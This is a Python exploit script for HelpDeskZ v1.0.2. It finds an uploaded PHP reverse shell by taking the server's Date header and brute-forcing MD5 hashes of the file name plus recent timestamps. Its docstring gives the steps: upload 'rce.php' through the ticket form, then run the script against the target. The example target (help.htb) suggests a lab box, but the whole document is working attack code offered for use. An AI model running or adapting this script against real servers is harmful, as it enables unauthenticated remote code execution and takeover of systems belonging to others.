import hashlib
import time, calendar
import sys
import requests
import argparse
from urllib.parse import urljoin
import traceback

def trigger_rce(target, nameOfUploadedFile):
    """
    To exploit the vulnerability you have to:
    - Fill in the required fields with any input, attach your 'rce.php' file, complete the CAPTCHA, and submit the ticket form.
    - Run this script with the necessary arguments to proceed with the next steps.
    """

    helpdeskzBaseUrl = urljoin(target, "/support/uploads/tickets/")
    print("[*] HelpDesk uploads URL: ", helpdeskzBaseUrl)
    fileName = nameOfUploadedFile

    response = requests.head(helpdeskzBaseUrl)
    serverTime = response.headers["Date"]
    timeFormat = "%a, %d %b %Y %H:%M:%S %Z"
    currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))

    print("[+] Enumerating the uploaded reverse shell file name on the server ...")
    for x in range(0, 300):
        plaintext = fileName + str(currentTime - x)
        md5hash = hashlib.md5(plaintext.encode()).hexdigest()

        url = helpdeskzBaseUrl+md5hash+'.php'
        print("[*]", url)
        try:
            response = requests.head(url)
            if response.status_code == 200:
                print("[+] Found!")
                print(url)
                sys.exit(0)
        except Exception as e:
            print("[-] Failed to send the payload: ", e)
            traceback.print_exc()

    print("[-] Could not find anything")

def main():
    parser = argparse.ArgumentParser(description="Helpdeskz v1.0.2 - Unauthenticated shell upload exploit")
    parser.add_argument("target", help="Target URL of IP address (e.g, http://help.htb)")
    parser.add_argument("nameOfUploadedFile", help="The name of the uploaded PHP reverse shell file (e.g, rce.php)")
    args = parser.parse_args()

    trigger_rce(args.target, args.nameOfUploadedFile)

if __name__ == "__main__":
    main()
